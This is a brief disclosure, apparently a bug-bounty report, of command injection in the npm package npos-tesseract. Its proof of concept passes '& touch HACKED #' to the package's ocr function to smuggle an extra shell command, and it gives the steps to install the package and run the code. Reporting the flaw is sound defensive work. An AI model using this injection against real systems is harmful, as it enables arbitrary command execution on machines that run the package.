# Description

Command Injection in npos-tesseract

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a = require("npos-tesseract");
a.ocr("& touch HACKED #","",function(){});
```

2. Execute the following commands in terminal:

```
npm i npos-tesseract # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
